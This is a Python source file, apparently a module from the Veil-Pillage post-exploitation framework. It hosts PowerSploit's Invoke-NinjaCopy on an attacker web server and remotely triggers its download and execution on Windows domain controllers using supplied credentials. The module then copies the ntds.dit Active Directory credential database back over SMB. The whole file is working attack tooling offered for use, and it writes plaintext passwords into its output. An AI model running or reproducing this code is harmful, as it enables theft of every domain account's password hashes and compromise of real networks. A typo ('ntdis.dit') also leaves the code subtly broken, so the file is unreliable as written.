"""

Execute PowerSploit's CodeExecution/Invoke-NinjaCopy.ps1 module on our host.

We do this by throwing up a temporary web server, hosting the script and using
invoking the downloader launcher on the host.

All cred to the PowerSploit guys !
    https://github.com/mattifestation/PowerSploit/

Module built by @harmj0y

TODO: testing

"""

import time

import settings
from lib import delivery_methods
from lib import smb
from lib import helpers

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Invoke-NinjaCopy"
        self.description = ("Execute PowerSploit's Invoke-NinjaCopy module on a host. "
                            "This will allow us to copy off the ntds to our local machine. "
                            "                             NOTE: only run this on a domain controller.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                    "use_ssl"           :   ["false", "use https for hosting"],
                                    "lhost"             :   ["", "lhost for hosting"],
                                    "host_file"         :   ["ntds.dit", "file on the host to copy"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        use_ssl = self.required_options["use_ssl"][0]
        lhost = self.required_options["lhost"][0]
        triggerMethod = self.required_options["trigger_method"][0]
        host_file = self.required_options["host_file"][0]

        # the protected file on the host to copy
        if host_file == "ntdis.dit":
            host_file = "C:\\Windows\\ntds\\ntds.dit" 

        # Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\windows\temp\ntds.dit"
        # local file to copy into
        localFile = "C:\\Windows\\Temp\\"+host_file.split("\\")[-1]

        # path to the PowerSploit Invoke-Mimikatz.ps1 powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/PowerSploit/Invoke-NinjaCopy.ps1"

        # pass the arguments to invoke ninja-copy       
        scriptArguments = "Invoke-NinjaCopy -Path \""+host_file+"\" -LocalDestination "+localFile

        # trigger the powershell download on all targets
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, scriptArguments, triggerMethod=triggerMethod, ssl=use_ssl)

        for target in self.targets:
            self.output += "[*] Powersploit:Invoke-NinjaCopy triggered using creds '"+username+":"+password+"' on "+target+"\n"

        print "\n [*] Waiting 30s for NinjaCopy to run..."
        time.sleep(30)

        for target in self.targets:

            # grab the output file and delete it
            out = smb.getFile(target, username, password, localFile, delete=False)

            # save the file off to the appropriate location
            saveFile = helpers.saveModuleFile(self, target, host_file.split("\\")[-1], out)

            if out != "":
                self.output += "[*] Powersploit:Invoke-NinjaCopy results using creds '"+username+":"+password+"' on "+target+" stored at "+saveFile+"\n"
            else:
                self.output += "[!] Powersploit:Invoke-NinjaCopy failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"
